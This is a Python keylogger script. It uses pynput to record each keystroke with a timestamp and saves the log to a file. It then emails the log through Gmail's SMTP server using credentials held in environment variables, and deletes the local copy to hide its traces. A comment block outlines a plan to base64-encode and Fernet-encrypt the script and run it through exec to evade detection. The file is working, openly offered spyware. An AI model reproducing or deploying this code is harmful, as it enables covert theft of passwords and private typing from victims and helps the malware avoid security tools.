import datetime
import time
from pynput.keyboard import Listener
import sys
import os
import smtplib
# def encode(data) -> bytes:
#     try:
#         # Standard Base64 Encoding
#         encodedBytes = base64.b64encode(data.encode("utf-8"))
#         return encodedBytes
#     except:
#         return b""
#
#
# def decode(data) -> bytes:
#     try:
#         message_bytes = base64.b64decode(data)
#         return message_bytes   # .decode('utf-8')
#     except:
#         return b""
# with open("bs64_enc_escript.txt", 'wb') as f:
#     f.write(code)
'''
1) encode py to base64 bytes and save it
2) store it in a string
3) call the base64.decode() directly on the string
4) user fernet encryption 
5) run using exec
'''

class KeyLogger:
    def __init__(self, save=True, gmail=False, timer=0):
        self.count_rshift_press = 0
        self.timer = timer
        if self.timer:
            self.start_time = time.time()
        self.LOG = ""
        self.LOG_FILE = 'keys.log'
        self.gmail = gmail
        self.save = save

    def run(self):
        with Listener(on_press=self.op) as listener:
            listener.join()

            self.logger(self.LOG_FILE, self.LOG)
            if self.gmail:
                self.send_gmail(os.environ['GMAIL_USR'].strip(), os.environ['GMAIL_RECV'].strip(),
                                os.environ['GMAIL_PSWD'].strip(), self.LOG)
            if not self.save:
                os.remove(self.LOG_FILE)

    def op(self, key):

        key_press = ''

        try:
            key_press = key.name
        except Exception as e:
            key_press = str(key)
        if key_press == 'shift_r':  # Kill switch -> right shift
            self.count_rshift_press += 1
            if self.count_rshift_press > 2:
                sys.exit()

        if key_press:
            log_result = f"\n {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M:%S')} \t {key_press}"
            self.LOG += log_result
            if self.timer:
                if time.time() - self.start_time > self.timer:
                    sys.exit()

    def logger(self, file: str, log=''):
        try:
            with open(file, 'w') as f:
                f.write(log)
        except Exception as e:
            pass

    def send_gmail(self, sender: str, recipient: str, password: str, message=""):
        try:
            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(sender, password)
            s.sendmail(sender, recipient, message)
            s.quit()
        except Exception as e:
            self.save = True
            self.logger(f"{self.LOG_FILE} Error : {str(e)}\n\n__________Offline Logging__________\n\n {self.LOG}")


keylog = KeyLogger(save=False, gmail=True)
keylog.run()
